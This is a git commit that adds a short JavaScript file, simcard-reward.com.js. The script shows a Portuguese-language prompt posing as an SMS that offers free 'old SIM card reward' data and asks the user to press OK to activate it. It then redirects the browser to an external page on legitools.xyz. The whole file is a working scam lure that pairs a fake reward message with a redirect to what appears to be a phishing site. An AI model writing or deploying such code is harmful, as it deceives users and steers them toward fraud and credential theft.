27b10a0a7176aa952e492f48244c25d769b722b3
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-05 20:25:44 -0800

    Create simcard-reward.com.js

---
+++ simcard-reward.com.js
@@ -0,0 +1,5 @@
+var password = 'Dados gratuitos do cartão SIM antigo'
+password=prompt('SMS: Parabéns, seu número é elegível para receber dados gratuitos RECOMPENSA DE CARTÃO SIM ANTIGO, por favor, pressione OK para ATIVAR. ','Dados gratuitos do cartão SIM antigo');
+if (password != 'Dados gratuitos do cartão SIM antigo') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
